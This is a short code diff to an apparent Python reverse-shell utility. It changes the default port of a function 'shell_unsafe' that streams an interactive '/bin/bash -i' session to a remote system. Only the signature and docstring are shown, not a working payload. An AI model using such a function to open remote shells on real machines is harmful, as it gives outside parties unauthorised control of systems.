@@ -26,7 +26,7 @@ def _run_proccess(queue, cmd, remote_system, remote_port):
     queue.put('cmd ended')
 
 
-def shell_unsafe(cmd='/bin/bash -i', remote_system=None, remote_port=4441):
+def shell_unsafe(cmd='/bin/bash -i', remote_system=None, remote_port=4444):
     '''
     starts streaming a program to a remote server.
     traffic is in clear text and unsafe!
